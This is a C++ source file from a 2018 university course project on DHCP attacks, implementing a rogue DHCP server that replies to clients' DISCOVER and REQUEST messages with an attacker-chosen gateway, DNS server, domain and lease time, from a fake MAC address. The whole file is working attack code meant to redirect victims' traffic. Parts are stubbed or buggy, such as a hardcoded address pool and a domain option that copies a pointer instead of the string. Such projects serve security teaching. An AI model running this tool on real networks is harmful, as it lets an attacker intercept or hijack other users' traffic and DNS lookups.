/**************************************
*        Project to PDS - 2018        *
*            DHCP attacks             *
*      Michal Gabonay - xgabon00      *
*  Faculty of Information Technology  *
*    University of Technology Brno    *
**************************************/

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <sstream>

#include "socket.h"
#include "ethernet.h"
#include "dhcp.h"
#include "pds-dhcprogue.h"

uint32_t gateway;
uint32_t dns_server;
char *domain;
uint32_t lease_time;
char *gateway_str;
char *dns_server_str;
char *first;
char *last;

template<typename T>
T parsenum(char const *str)
{
  T val;
  std::stringstream s;
  if (str[0] == '0' && str[1] == 'x') s << std::hex << str;
  else s << str;
  s >> val;
  return val;
}

int main (int argc, char *argv[])
{
	int ch;
	char *interface_name;
	char *pool;
	char *lease_time_str;


	if ( argc != 13 ) { 		//wrong count of arguments
		printf("Usage:\n");
		printf("./pds-dhcprogue -i interface -p pool -g gateway -n dns-server -d domain -l lease-time\n");
	    // ./pds-dhcprogue -i eth1 -p 192.168.1.100-192.168.1.199 -g 192.168.1.1 -n 8.8.8.8 -d fit.vutbr.cz -l 3600
	    return EXIT_FAILURE;
  	}

  	while ((ch = getopt(argc, argv, "-i:-p:-g:-n:-d:-l:")) != -1) {
  		switch (ch) {
  			case 'i':
	  			interface_name = (char *) malloc(strlen(optarg) + 1);
	   			strcpy(interface_name, optarg);
	  			break;
	  		case 'p':
	  			pool = (char *) malloc(strlen(optarg) + 1);
	   			strcpy(pool, optarg);
	  			break;
	  		case 'g':
	  			gateway_str = (char *) malloc(strlen(optarg) + 1);
	   			strcpy(gateway_str, optarg);
	   			gateway = inet_addr(optarg);
	  			break;
	  		case 'n':
	  			dns_server_str = (char *) malloc(strlen(optarg) + 1);
	   			strcpy(dns_server_str, optarg);
	   			dns_server = inet_addr(optarg);
	  			break;
	  		case 'd':
	  			domain = (char *) malloc(strlen(optarg) + 1);
	   			strcpy(domain, optarg);
	  			break;
	  		case 'l':
	  			// lease_time = strtoul(optarg, NULL, strlen(optarg));
	  			lease_time_str = (char *) malloc(strlen(optarg) + 1);
	   			strcpy(lease_time_str, optarg);
	  			lease_time = parsenum<uint32_t>(lease_time_str);
	  			break;
	  		default:
	            fprintf(stderr, "Bad arguments!\n");
	            abort();
  		}
  	}
  	char *range = strtok(pool, "-");
  	first = (char *) malloc(strlen(range) + 1);
  	strcpy(first, range);
  	range = strtok(NULL, "-");
  	last = (char *) malloc(strlen(range) + 1);
  	strcpy(last, range);

  	// printf("Arguments:\n");
  	// printf("interface: %s\n", interface_name);
  	// printf("pool: %s\n", pool);
  	// printf("gateway: %s\n", gateway_str);
  	// printf("dns_server: %s\n", dns_server_str);
  	// printf("domain: %s\n", domain);
  	// printf("lease_time: %s\n", lease_time);

	int rcv_socket = 0;
	rcv_socket = create_socket_for_server();
	if (rcv_socket == -1)
	{
		return EXIT_FAILURE;
	}
	socklen_t addr_len = sizeof(struct sockaddr_in);
	while(1)
	{
		struct msg_t *msg = (struct msg_t*)malloc(sizeof(struct msg_t));
		if(NULL == msg)
		{
			printf("Malloc failed! %s", strerror(errno));
			continue;
		}
		memset(msg, 0, sizeof(struct msg_t));
		msg->socket_fd = rcv_socket;
		msg->len = recvfrom(rcv_socket, msg->buff, DHCP_MAX_MTU, 0, (struct sockaddr*)&msg->address, &addr_len);
		// printf("%d bytes received\n", msg->len);
		if(msg->len < 0)
		{
			printf("Error recvfrom: %s", strerror(errno));
			free(msg);
			continue;
		}
		dhcp_packet_t *response_packet = process_dhcp_msg((void *) msg);
		
		if (response_packet != NULL)
		{
			uint32_t msg_type = 0;
			if (0 != dhcp_get_option(response_packet, DHCP_OPTION_MESSAGE_TYPE, &msg_type, sizeof(msg_type), NULL)) 
		    {
		        msg_type = 0;
		    }
			if(0 == msg_type)
			{
				continue;
			}

			int sock_send = 0;
			sock_send = create_dhcp_send_socket();

			unsigned char buffer[1500];
			int bufflen;
			int sent_bytes;
			struct sockaddr_ll lladdr;
			int dhcplen = get_dhcp_packet_size(response_packet);
			int interface_index = 0;        // Interface number
			if (-1 == (interface_index = get_interface_index(sock_send, interface_name)))
				continue;
			// int dhcplen =sizeof(&dhcp_packet)+1;

			init_sock_addr(&lladdr, interface_index);
			unsigned char server_fake_mac[ETHERNET_HARDWARE_ADDRESS_LENGTH];
			generate_mac_addr(server_fake_mac);
			char *src_ip = (char *)"192.168.1.1";
			uint32_t dest_ip;
			if (msg_type == DHCPOFFER)
			{
				dest_ip = inet_addr((char *)"255.255.255.255");
			} else if (msg_type == DHCPACK)
			{
				dest_ip = response_packet->yiaddr;
			}
					
			bufflen = create_server_dhcp_packet(buffer, sizeof(buffer), response_packet,
			                           (size_t)dhcplen, server_fake_mac,
			                           src_ip, dest_ip);

			if (bufflen < 0) {
				printf("Error: can not initialize packet to send\n");
				continue;
			}

			sent_bytes = sendto(sock_send, buffer, (size_t)bufflen, 0,
			                  (struct sockaddr *)&lladdr, sizeof(struct sockaddr_ll));
			if (sent_bytes <= 0) {
				printf("Error: can not send DHCP packet: %s\n", strerror(errno));
				continue;
			}
			// printf("%d bytes sended\n", sent_bytes);

			// TODO serialize
			// int length = serialize(response_packet, buffer, DHCP_MAX_MTU);

			if(0 != sock_send)
			{
				close(sock_send);
			}

			free(response_packet);
		}
	}
}

dhcp_packet_t * process_dhcp_msg(void *rcv_msg)
{
	struct msg_t *msg = (struct msg_t*)rcv_msg;
	dhcp_packet_t *dhcp_packet;

	dhcp_packet = parse_msg(msg->buff);

	if(dhcp_packet->op != BOOTREQUEST)
	{
		printf("Packet is not send from dhcp client, ignor!");
		return NULL;
	}

	uint32_t msg_type = 0;
	if (0 != dhcp_get_option(dhcp_packet, DHCP_OPTION_MESSAGE_TYPE, &msg_type, sizeof(msg_type), NULL)) 
    {
        msg_type = 0;
    }

	if(0 == msg_type)
	{
		// printf("No dhcp message type found in the packet!");
		return NULL;
	}
	// printf("packet type=%d\n", msg_type);

	dhcp_packet_t *response = NULL;
	if (msg_type == DHCPDISCOVER)
	{
		// TODO: send OFFER
		// printf("creating OFFER ...\n");
		response = create_offer(dhcp_packet);
	} else if (msg_type == DHCPREQUEST)
	{
		// printf("creating ACK ...\n");
		response = create_ack(dhcp_packet);
	}

	return response;
}

dhcp_packet_t *parse_msg(char *buff)
{
	dhcp_packet_t *dhcp_packet = (dhcp_packet_t *)buff;

	return dhcp_packet;
}

dhcp_packet_t *create_offer(dhcp_packet_t *rcv_packet)
{
	//TODO reserve ip in pool
	uint32_t offered_addr = alocate_ip();
	if (offered_addr == 0)
	{
		return NULL;
	}

	dhcp_packet_t *dhcp_packet = (dhcp_packet_t*)malloc(sizeof(dhcp_packet_t));
	if(NULL == dhcp_packet)
	{
		printf("Malloc failed! %s", strerror(errno));
		return NULL;
	}
	memset(dhcp_packet, 0, sizeof(dhcp_packet_t));

	dhcp_packet->op = BOOTREPLY;
	dhcp_packet->htype = rcv_packet->htype;
	dhcp_packet->hlen = rcv_packet->hlen;
	dhcp_packet->hops = 1;
	dhcp_packet->xid = rcv_packet->xid;
	dhcp_packet->yiaddr = offered_addr;
	dhcp_packet->flags = rcv_packet->flags;
	// dhcp_packet->chaddr = rcv_packet->chaddr;
	memcpy(dhcp_packet->chaddr, rcv_packet->chaddr, sizeof(rcv_packet->chaddr));

	// offer options
	/* first four bytes of options field is magic cookie (as per RFC 2132) */
	dhcp_packet->options[0] = '\x63';
	dhcp_packet->options[1] = '\x82';
	dhcp_packet->options[2] = '\x53';
	dhcp_packet->options[3] = '\x63';

	// msg type
	dhcp_packet->options[4] =
	  DHCP_OPTION_MESSAGE_TYPE;    /* DHCP message type option identifier */
	dhcp_packet->options[5] = '\x01'; /* DHCP message option length in bytes */
	dhcp_packet->options[6] = DHCPOFFER;

    uint32_t server_identifier = inet_addr((char *)"192.168.1.1");
    uint32_t subnet_mask = inet_addr((char *)"255.255.255.0");
    // unsigned char *subnet_mask = (unsigned char *)"255.255.255.0";
    // printf("%s\n", server_identifier);
    // printf("%u\n", server_identifier);

	// server identifier
	dhcp_packet->options[7] =
        DHCP_OPTION_SERVER_IDENTIFIER; /* DHCP message type option identifier */
    dhcp_packet->options[8] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[9], &server_identifier, sizeof(server_identifier));

	// subnet mask
	dhcp_packet->options[13] =
        DHCP_OPTION_SUBNET_MASK; /* DHCP message type option identifier */
    dhcp_packet->options[14] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[15], &subnet_mask, sizeof(subnet_mask));

	// lease time
	dhcp_packet->options[19] =
        DHCP_OPTION_LEASE_TIME; /* DHCP message type option identifier */
    dhcp_packet->options[20] = '\x04';  /* DHCP message option length in bytes */
    

	uint32_t   val  = 0x01;
   	char     * buff = (char *)&val;
    if (buff[0] == 0)
    {
    	memcpy(&dhcp_packet->options[21], &lease_time, 4);
	} else {
		uint32_t num = lease_time;
		uint32_t b0,b1,b2,b3;
		uint32_t res;

		b0 = (num & 0x000000ff) << 24u;
		b1 = (num & 0x0000ff00) << 8u;
		b2 = (num & 0x00ff0000) >> 8u;
		b3 = (num & 0xff000000) >> 24u;

		res = b0 | b1 | b2 | b3;

    	memcpy(&dhcp_packet->options[21], &res, sizeof(res));
	}

	// router (gateway)
	dhcp_packet->options[25] =
        DHCP_OPTION_ROUTER; /* DHCP message type option identifier */
    dhcp_packet->options[26] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[27], &gateway, sizeof(gateway));

	// DNS server
	dhcp_packet->options[31] =
        DHCP_OPTION_DNS_SERVER; /* DHCP message type option identifier */
    dhcp_packet->options[32] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[33], &dns_server, sizeof(dns_server));
	
	// domain name
	dhcp_packet->options[37] =
        DHCP_OPTION_DOMAIN_NAME; /* DHCP message type option identifier */
    dhcp_packet->options[38] = strlen(domain);  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[39], (unsigned char *)&domain, sizeof(domain));

	// dhcp options end
	dhcp_packet->options[39+strlen(domain)] = 255;

	return dhcp_packet;
}

dhcp_packet_t *create_ack(dhcp_packet_t *rcv_packet)
{
	uint32_t offered_addr = alocate_ip();
	if (offered_addr == 0)
	{
		return NULL;
	}

	dhcp_packet_t *dhcp_packet = (dhcp_packet_t*)malloc(sizeof(dhcp_packet_t));
	if(NULL == dhcp_packet)
	{
		printf("Malloc failed! %s", strerror(errno));
		return NULL;
	}
	memset(dhcp_packet, 0, sizeof(dhcp_packet_t));

	dhcp_packet->op = BOOTREPLY;
	dhcp_packet->htype = rcv_packet->htype;
	dhcp_packet->hlen = rcv_packet->hlen;
	dhcp_packet->hops = 1;
	dhcp_packet->xid = rcv_packet->xid;
	dhcp_packet->yiaddr = offered_addr;
	dhcp_packet->flags = rcv_packet->flags;
	// dhcp_packet->chaddr = rcv_packet->chaddr;
	memcpy(dhcp_packet->chaddr, rcv_packet->chaddr, sizeof(rcv_packet->chaddr));

	// offer options
	/* first four bytes of options field is magic cookie (as per RFC 2132) */
	dhcp_packet->options[0] = '\x63';
	dhcp_packet->options[1] = '\x82';
	dhcp_packet->options[2] = '\x53';
	dhcp_packet->options[3] = '\x63';

	// msg type
	dhcp_packet->options[4] =
	  DHCP_OPTION_MESSAGE_TYPE;    /* DHCP message type option identifier */
	dhcp_packet->options[5] = '\x01'; /* DHCP message option length in bytes */
	dhcp_packet->options[6] = DHCPACK;

    uint32_t server_identifier = inet_addr((char *)"192.168.1.1");
    uint32_t subnet_mask = inet_addr((char *)"255.255.255.0");
    // unsigned char *subnet_mask = (unsigned char *)"255.255.255.0";
    // printf("%s\n", server_identifier);
    // printf("%u\n", server_identifier);

	// server identifier
	dhcp_packet->options[7] =
        DHCP_OPTION_SERVER_IDENTIFIER; /* DHCP message type option identifier */
    dhcp_packet->options[8] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[9], &server_identifier, sizeof(server_identifier));

	// subnet mask
	dhcp_packet->options[13] =
        DHCP_OPTION_SUBNET_MASK; /* DHCP message type option identifier */
    dhcp_packet->options[14] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[15], &subnet_mask, sizeof(subnet_mask));

	// lease time
	dhcp_packet->options[19] =
        DHCP_OPTION_LEASE_TIME; /* DHCP message type option identifier */
    dhcp_packet->options[20] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[21], (unsigned int *)&lease_time, sizeof(unsigned int));

	// router (gateway)
	dhcp_packet->options[25] =
        DHCP_OPTION_ROUTER; /* DHCP message type option identifier */
    dhcp_packet->options[26] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[27], &gateway, sizeof(gateway));

	// DNS server
	dhcp_packet->options[31] =
        DHCP_OPTION_DNS_SERVER; /* DHCP message type option identifier */
    dhcp_packet->options[32] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[33], &dns_server, sizeof(dns_server));
	
	// domain name
	dhcp_packet->options[37] =
        DHCP_OPTION_DOMAIN_NAME; /* DHCP message type option identifier */
    dhcp_packet->options[38] = strlen(domain);  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet->options[39], (unsigned char *)&domain, sizeof(domain));

	// dhcp options end
	dhcp_packet->options[39+strlen(domain)] = 255;

	return dhcp_packet;
}

uint32_t alocate_ip()
{
	// TODO
	char *ip = (char *)"192.168.1.100";
	return inet_addr(ip);
}

